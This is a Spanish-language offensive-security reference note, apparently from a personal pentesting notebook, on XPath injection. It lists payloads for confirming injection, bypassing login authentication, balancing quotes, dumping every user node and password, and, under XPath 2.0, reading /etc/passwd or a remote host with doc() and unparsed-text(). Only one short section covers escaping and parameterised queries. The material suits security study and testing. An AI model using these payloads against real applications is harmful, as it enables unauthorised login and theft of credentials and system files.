---
tipo: meta
aliases:
  - payloads XPath
  - XPath syntax
  - XPath auth bypass payloads
tags:
  - meta/referencia
  - dominio/web
---

# XPath consulta - matriz de referencia

> [!info] Referencia pura, no un zettel
> La sintaxis de XPath y los payloads de manipulación. La extracción ciega está en [[XPath extracción ciega - matriz de referencia]]; el criterio, en [[MOC - XPath injection]].

## 0. La sintaxis, en una tabla

| Elemento | Significa |
|---|---|
| `/nodo` | Hijo directo desde la raíz |
| `//nodo` | Nodo en cualquier nivel |
| `nodo[cond]` | Filtro con condición |
| `text()` | El texto de un nodo |
| `@attr` | Un atributo |
| `*` | Cualquier nodo |
| `and` `or` `not()` | Booleanos |
| `=` `!=` `>` `<` | Comparación |
| `position()` `last()` | Posición en el conjunto |

Consulta de login típica:
```
//usuario[nombre/text()='INPUT' and clave/text()='INPUT']
```

## 1. Confirmar la inyección

Meter una comilla y ver si rompe:

`'`  → error de expresión mal formada = inyectable
`'or'1'='1`  → ¿cambia el resultado?
`' or 1=1 or '`

Un `'` que da error de XPath (no de la aplicación) confirma que la entrada llega a la expresión.

## 2. Salto de autenticación

Como no hay comentarios, hay que **balancear** las comillas para que la expresión quede válida hasta el final.

```
nombre = ' or '1'='1
→ //usuario[nombre='' or '1'='1' and clave='...']
```

Payloads de bypass (uno por línea, probar según la estructura):

`' or '1'='1`
`' or '1'='1' or 'a'='a`
`' or true() or '`
`' or 1=1 or '`
`admin' or '1'='1`
`' or position()=1 or '`
`') or ('1'='1`
`" or "1"="1`

El de comillas dobles (`"`) para cuando la consulta usa comillas dobles en vez de simples.

## 3. Balanceo — el detalle de XPath

Sin `--`, el resto de la consulta original queda y hay que dejarlo válido. Tres formas:

| Técnica | Payload |
|---|---|
| Cerrar y reabrir | `' or '1'='1' or 'a'='a` — deja el `clave='...'` dentro de un string |
| Comodín que absorbe | `' or 'x'='x` con la estructura que quede |
| Neutralizar con `and` | `' and '1'='2' or '1'='1` |

Contar las comillas de la consulta original —inferida— y balancearlas es el trabajo. La forma `' or '1'='1' or 'a'='a` funciona en la mayoría de los `and` de dos términos.

## 4. Ampliar el conjunto de nodos

Cuando el resultado se refleja, devolver de más:

`' or true() or '`  → todos los nodos usuario
`' or 1=1 or '`
`'] | //usuario['`  → unión de conjuntos, el `|` de XPath
`' or count(//usuario)>0 or '`

El `|` es el equivalente del `UNION` de SQL, pero sin control de acceso: une conjuntos de nodos de todo el documento.

## 5. Funciones útiles

| Función | Para qué |
|---|---|
| `string-length(X)` | Largo de un valor |
| `substring(X,p,n)` | Subcadena — el motor de la extracción ciega |
| `count(X)` | Cuántos nodos |
| `name(X)` / `local-name(X)` | Nombre de un nodo, para descubrir el esquema |
| `position()` | Posición en el conjunto |
| `concat(a,b)` | Unir cadenas |
| `contains(X,'s')` | ¿contiene la subcadena? |
| `starts-with(X,'s')` | ¿empieza con? |

## 6. Recorrer todo el documento

Sin control de acceso por nodo, todo es alcanzable una vez inyectado:

`/*` → la raíz
`//*` → todos los nodos
`//usuario/clave` → todas las contraseñas
`//*[contains(name(),'pass')]` → nodos cuyo nombre contiene 'pass'

Es la ventaja sobre SQLi: no hay `UNION` ni permisos que sortear, el documento entero se recorre.

## 7. XPath 2.0 y XQuery

Si el motor es 2.0, hay funciones extra:

`doc('http://mi-host/x')` → lectura remota, se cruza con [[MOC - SSRF]]
`doc('file:///etc/passwd')` → lectura de archivos, se cruza con [[MOC - XXE]]
`unparsed-text('/etc/passwd')` → lectura de texto

Probar si es 2.0: `' or string-length(current-date())>0 or '` —`current-date()` solo existe en 2.0.

## 8. Escape — lo que la defensa debería hacer

| Carácter | Escape / manejo |
|---|---|
| `'` | Escapar, o usar consulta parametrizada |
| `"` | Igual |
| `<` `>` `&` | Del XML, si la entrada arma el documento |

Recomendar consultas XPath parametrizadas (variables enlazadas) por sobre el escape manual.

## 9. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| La comilla da error de la app, no de XPath | Puede escaparse; probar comilla doble |
| El bypass no balancea | Contar las comillas del original; usar `' or '1'='1' or 'a'='a` |
| Entra pero no como admin | Devolvió el primer nodo; afinar con `position()` o el nombre |
| `and` no se puede neutralizar | Probar `') or ('1'='1` con paréntesis |
| `doc()` no existe | Es XPath 1.0, sin lectura externa |
| Todo escapado | Escape correcto o parametrizado. Buena mitigación |

## Relacionadas

[[MOC - XPath injection]] · [[XPath extracción ciega - matriz de referencia]] · [[XPath - manipulación de la consulta]] · [[SQLi contextos - matriz de referencia]]
